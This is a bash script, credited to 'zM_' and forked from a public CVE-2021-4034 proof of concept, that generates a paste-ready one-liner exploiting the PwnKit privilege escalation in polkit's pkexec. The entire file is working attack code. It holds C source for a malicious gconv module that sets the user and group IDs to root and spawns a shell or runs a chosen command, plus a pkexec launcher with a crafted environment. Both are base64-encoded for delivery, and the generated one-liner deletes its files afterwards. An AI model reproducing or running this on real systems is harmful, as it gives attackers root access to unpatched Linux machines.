#!/bin/bash
# PwnKit oneliner generator
# Author: zM_
# Forked from: https://github.com/berdav/CVE-2021-4034

SO_NAME=pwnkit.so
EX_NAME=x

VERBOSE=false
COMPILE=false

usage() {
        >&2 echo "$0 [-v] [-h|--help] [<payload>]"
        >&2 echo "    -h|--help   This help message"
        >&2 echo "    -v          Verbose"
        >&2 echo "    -c          Compile lib & exploit locally"
        >&2 echo "    <payload>   Cmd to execute on target. Spawns a shell if empty"
}

# Parse script args
while [ "$#" -gt 0 ]; do
        [ "${1:0:1}" = "-" ] || break          # Not a -flag
        [[ "$1" =~ ^--$ ]] && shift && break   # --

        if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
                usage
                exit
        elif [ "$1" = "-v" ]; then
                VERBOSE=true
        elif [ "$1" = "-c" ] || [ "$1" = "--compile" ]; then
                COMPILE=true
        else
                >&2 echo "Error: \"$1\" is not a valid option."
                usage
                exit
        fi

        shift
done

if $VERBOSE; then
        echo "Payload: $@"
fi

# Parse payload
[ "$#" -gt 0 ] && args=', "-c"' || args=''
while [ "$#" -gt 0 ]; do
        args="$args ,\"$1\""
        shift
done

LIB=$(cat << LIB
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void){}
void gconv_init(void *step){
        char*const args[]={"/bin/sh"$args,NULL};
        char*const environ[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin",NULL};
        setuid(0);
        setgid(0);
        execve(args[0],args,environ);
        exit(0);
}
LIB
)

EXP=$(cat <<EXP
#include <unistd.h>
int main(int argc,char **argv){
        char*const args[]={NULL};
        char*const environ[]={
                "$SO_NAME:.",
                "PATH=GCONV_PATH=.",
                "SHELL=/do/not/exists",
                "CHARSET=PWNKIT",
                "GIO_USE_VFS=",
                NULL
        };
        return execve("/usr/bin/pkexec",args,environ);
}
EXP
)

clean() {
        sed ':a;N;$!ba;s/\n\s\+//g' <&0
}

echo -n 'mkdir -p GCONV_PATH=.&&'
echo -n "cp /bin/true GCONV_PATH=./$SO_NAME:.&&"
echo -n "echo 'module UTF-8// PWNKIT// pwnkit 1'>gconv-modules&&"

if $COMPILE; then
        tmp="$(mktemp -d)"
        prev="$(pwd)"
        cd "$tmp"
        echo "$LIB" | gcc --shared -fPIC -o $SO_NAME -x c -
        echo "$EXP" | gcc -o $EX_NAME -x c -
        strip -s $SO_NAME $EX_NAME

        LIB_BIN="$(cat $SO_NAME | gzip | base64 -w0)"
        EXP_BIN="$(cat $EX_NAME | gzip | base64 -w0)"
        
        echo -n "echo '$LIB_BIN'|base64 -d|zcat>$SO_NAME&&"
        echo -n "echo '$EXP_BIN'|base64 -d|zcat>$EX_NAME&&"
        cd "$prev"
        rm -rf $tmp
else
        LIB_B64="$(echo "$LIB" | clean | base64 -w0)"
        EXP_B64="$(echo "$EXP" | clean | base64 -w0)"
        echo -n "echo '$LIB_B64'|base64 -d|gcc --shared -fPIC -x c - -o $SO_NAME&&"
        echo -n "echo '$EXP_B64'|base64 -d|gcc -x c - -o $EX_NAME&&"
fi

echo -n "chmod +x $EX_NAME&&./$EX_NAME||echo "nope";rm -rf GCONV_PATH=. gconv-modules $SO_NAME $EX_NAME"
